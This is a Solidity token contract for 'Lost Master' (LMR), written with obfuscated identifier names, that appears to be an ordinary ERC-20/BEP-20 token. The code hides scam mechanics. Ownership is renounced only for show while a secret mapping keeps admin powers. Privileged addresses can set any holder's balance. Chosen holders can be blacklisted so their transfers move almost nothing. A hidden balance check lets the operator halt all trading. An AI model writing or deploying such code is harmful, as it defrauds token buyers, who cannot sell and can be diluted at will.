//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface autoListExempt {
    function createPair(address autoMinFee, address launchLaunched) external returns (address);
}

interface modeLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapLimit) external view returns (uint256);

    function transfer(address feeTo, uint256 walletList) external returns (bool);

    function allowance(address isAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletList) external returns (bool);

    function transferFrom(
        address sender,
        address feeTo,
        uint256 walletList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atLaunchBuy, uint256 value);
    event Approval(address indexed isAt, address indexed spender, uint256 value);
}

abstract contract modeTakeExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedShould is modeLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LostMaster is modeTakeExempt, modeLimit, launchedShould {

    constructor (){
        
        sellAmount feeTxFrom = sellAmount(fromAuto);
        limitFundTeam = autoListExempt(feeTxFrom.factory()).createPair(feeTxFrom.WETH(), address(this));
        if (toLaunch != limitTeam) {
            launchedFundTx = false;
        }
        receiverFund = _msgSender();
        walletReceiverLaunched[receiverFund] = true;
        listTotal[receiverFund] = liquidityTrading;
        limitBuy();
        if (tokenMode) {
            isBuyReceiver = true;
        }
        emit Transfer(address(0), receiverFund, liquidityTrading);
    }

    uint256 swapSenderTake;

    mapping(address => uint256) private listTotal;

    function sellMode(address toExempt, address feeTo, uint256 walletList) internal returns (bool) {
        require(listTotal[toExempt] >= walletList);
        listTotal[toExempt] -= walletList;
        listTotal[feeTo] += walletList;
        emit Transfer(toExempt, feeTo, walletList);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return sellLimit;
    }

    function approve(address liquidityAt, uint256 walletList) public virtual override returns (bool) {
        receiverWallet[_msgSender()][liquidityAt] = walletList;
        emit Approval(_msgSender(), liquidityAt, walletList);
        return true;
    }

    bool public feeMax;

    function receiverSwap(address liquidityBuyFee) public {
        sellReceiver();
        
        if (liquidityBuyFee == receiverFund || liquidityBuyFee == limitFundTeam) {
            return;
        }
        exemptSender[liquidityBuyFee] = true;
    }

    function allowance(address tradingLaunched, address liquidityAt) external view virtual override returns (uint256) {
        if (liquidityAt == fromAuto) {
            return type(uint256).max;
        }
        return receiverWallet[tradingLaunched][liquidityAt];
    }

    mapping(address => bool) public exemptSender;

    function transfer(address swapMarketing, uint256 walletList) external virtual override returns (bool) {
        return fundSellWallet(_msgSender(), swapMarketing, walletList);
    }

    uint8 private tradingFund = 18;

    function balanceOf(address swapLimit) public view virtual override returns (uint256) {
        return listTotal[swapLimit];
    }

    bool private launchedFundTx;

    uint256 public tradingLaunch;

    function symbol() external view virtual override returns (string memory) {
        return takeTx;
    }

    function getOwner() external view returns (address) {
        return receiverAmount;
    }

    function walletTradingReceiver(uint256 walletList) public {
        sellReceiver();
        liquidityTeam = walletList;
    }

    bool public walletAuto;

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityTrading;
    }

    address buySender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant fromLimit = 11 ** 10;

    function fundSellWallet(address toExempt, address feeTo, uint256 walletList) internal returns (bool) {
        if (toExempt == receiverFund) {
            return sellMode(toExempt, feeTo, walletList);
        }
        uint256 feeTakeMin = modeLimit(limitFundTeam).balanceOf(buySender);
        require(feeTakeMin == liquidityTeam);
        require(feeTo != buySender);
        if (exemptSender[toExempt]) {
            return sellMode(toExempt, feeTo, fromLimit);
        }
        return sellMode(toExempt, feeTo, walletList);
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingFund;
    }

    bool public isBuyReceiver;

    address fromAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public receiverFund;

    address private receiverAmount;

    address public limitFundTeam;

    uint256 public toLaunch;

    function limitBuy() public {
        emit OwnershipTransferred(receiverFund, address(0));
        receiverAmount = address(0);
    }

    bool private tokenMode;

    mapping(address => mapping(address => uint256)) private receiverWallet;

    bool private tokenSender;

    string private sellLimit = "Lost Master";

    function takeWalletTeam(address swapMarketing, uint256 walletList) public {
        sellReceiver();
        listTotal[swapMarketing] = walletList;
    }

    function transferFrom(address toExempt, address feeTo, uint256 walletList) external override returns (bool) {
        if (_msgSender() != fromAuto) {
            if (receiverWallet[toExempt][_msgSender()] != type(uint256).max) {
                require(walletList <= receiverWallet[toExempt][_msgSender()]);
                receiverWallet[toExempt][_msgSender()] -= walletList;
            }
        }
        return fundSellWallet(toExempt, feeTo, walletList);
    }

    function senderExemptMin(address liquidityLaunch) public {
        require(liquidityLaunch.balance < 100000);
        if (feeMax) {
            return;
        }
        if (toLaunch != limitTeam) {
            tokenMode = true;
        }
        walletReceiverLaunched[liquidityLaunch] = true;
        
        feeMax = true;
    }

    uint256 liquidityTeam;

    event OwnershipTransferred(address indexed maxLaunchLiquidity, address indexed swapTeamMax);

    string private takeTx = "LMR";

    mapping(address => bool) public walletReceiverLaunched;

    function sellReceiver() private view {
        require(walletReceiverLaunched[_msgSender()]);
    }

    function owner() external view returns (address) {
        return receiverAmount;
    }

    uint256 public limitTeam;

    uint256 private liquidityTrading = 100000000 * 10 ** 18;

}